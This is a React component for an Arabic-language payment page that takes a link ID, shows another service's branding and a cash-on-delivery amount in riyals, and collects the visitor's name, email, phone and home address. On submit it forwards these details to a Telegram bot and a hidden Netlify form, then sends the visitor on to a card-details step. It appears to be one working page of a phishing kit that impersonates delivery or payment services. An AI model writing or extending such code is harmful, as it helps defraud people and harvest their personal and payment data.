import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { getServiceBranding } from "@/lib/serviceLogos";
import PaymentRouterStandalone from "@/components/PaymentRouterStandalone";
import { sendToTelegram } from "@/lib/telegram";
import { CreditCard, ArrowLeft, User, Mail, Phone, MapPin } from "lucide-react";

const StandalonePaymentRecipient = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");

  return (
    <PaymentRouterStandalone>
      {(linkData) => {
        const serviceKey = linkData.service_key;
        const serviceName = linkData.service_name;
        const branding = getServiceBranding(serviceKey);
        const amount = linkData.cod_amount;
        const formattedAmount = `${amount} ر.س`;

        const handleProceed = async (e: React.FormEvent) => {
          e.preventDefault();

          // Save customer info to sessionStorage for next steps
          sessionStorage.setItem('customerInfo', JSON.stringify({
            name: customerName,
            email: customerEmail,
            phone: customerPhone,
            address: residentialAddress,
            service: serviceName,
            amount: formattedAmount
          }));

          // Submit to Netlify Forms
          const formData = new FormData();
          formData.append('form-name', 'standalone-payment-recipient');
          formData.append('name', customerName);
          formData.append('email', customerEmail);
          formData.append('phone', customerPhone);
          formData.append('address', residentialAddress);
          formData.append('service', serviceName);
          formData.append('amount', formattedAmount);
          formData.append('linkId', id || '');

          try {
            await fetch('/', {
              method: 'POST',
              headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
              body: new URLSearchParams(formData as Record<string, string>).toString()
            });
          } catch (error) {
            console.error('Form submission error:', error);
          }

          // Send data to Telegram
          await sendToTelegram({
            type: 'standalone_payment_recipient',
            data: {
              name: customerName,
              email: customerEmail,
              phone: customerPhone,
              address: residentialAddress,
              service: serviceName,
              amount: formattedAmount,
              linkId: id || '',
              payment_url: `${window.location.origin}/standalone-pay/${id}/details`
            },
            timestamp: new Date().toISOString()
          });

          navigate(`/standalone-pay/${id}/details`);
        };

        return (
          <div className="min-h-screen bg-background" dir="rtl">
            <div className="container mx-auto px-3 sm:px-4 py-8">
              <div className="max-w-2xl mx-auto">
                <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
                  <form onSubmit={handleProceed}>
                    <div className="flex items-center justify-between mb-6 sm:mb-8">
                      <h1 className="text-xl sm:text-3xl font-bold">معلومات المستلم</h1>

                      <div
                        className="w-14 h-14 sm:w-20 sm:h-20 rounded-2xl flex items-center justify-center shadow-lg"
                        style={{
                          background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                        }}
                      >
                        <CreditCard className="w-7 h-7 sm:w-10 sm:h-10 text-white" />
                      </div>
                    </div>

                    <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                      <div>
                        <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                          <User className="w-3 h-3 sm:w-4 sm:h-4" />
                          الاسم الكامل
                        </Label>
                        <Input
                          id="name"
                          value={customerName}
                          onChange={(e) => setCustomerName(e.target.value)}
                          required
                          className="h-10 sm:h-12 text-sm sm:text-base"
                          placeholder="أدخل اسمك الكامل"
                        />
                      </div>

                      <div>
                        <Label htmlFor="email" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                          <Mail className="w-3 h-3 sm:w-4 sm:h-4" />
                          البريد الإلكتروني
                        </Label>
                        <Input
                          id="email"
                          type="email"
                          value={customerEmail}
                          onChange={(e) => setCustomerEmail(e.target.value)}
                          required
                          className="h-10 sm:h-12 text-sm sm:text-base"
                          placeholder="example@email.com"
                        />
                      </div>

                      <div>
                        <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                          <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
                          رقم الهاتف
                        </Label>
                        <Input
                          id="phone"
                          type="tel"
                          value={customerPhone}
                          onChange={(e) => setCustomerPhone(e.target.value)}
                          required
                          className="h-10 sm:h-12 text-sm sm:text-base"
                          placeholder="+966 5X XXX XXXX"
                        />
                      </div>

                      <div>
                        <Label htmlFor="address" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                          <MapPin className="w-3 h-3 sm:w-4 sm:h-4" />
                          العنوان السكني
                        </Label>
                        <Input
                          id="address"
                          value={residentialAddress}
                          onChange={(e) => setResidentialAddress(e.target.value)}
                          required
                          className="h-10 sm:h-12 text-sm sm:text-base"
                          placeholder="أدخل عنوانك السكني الكامل"
                        />
                      </div>
                    </div>

                    <Button
                      type="submit"
                      size="lg"
                      className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
                      style={{
                        background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                      }}
                    >
                      <span className="ml-2">التالي</span>
                      <ArrowLeft className="w-4 h-4 sm:w-5 sm:h-5 mr-2" />
                    </Button>

                    <p className="text-[10px] sm:text-xs text-center text-muted-foreground mt-3 sm:mt-4">
                      بالمتابعة، أنت توافق على الشروط والأحكام
                    </p>
                  </form>

                  {/* Hidden Netlify Form */}
                  <form name="standalone-payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
                    <input type="text" name="name" />
                    <input type="email" name="email" />
                    <input type="tel" name="phone" />
                    <input type="text" name="address" />
                    <input type="text" name="service" />
                    <input type="text" name="amount" />
                    <input type="text" name="linkId" />
                  </form>
                </Card>
              </div>
            </div>
          </div>
        );
      }}
    </PaymentRouterStandalone>
  );
};

export default StandalonePaymentRecipient;
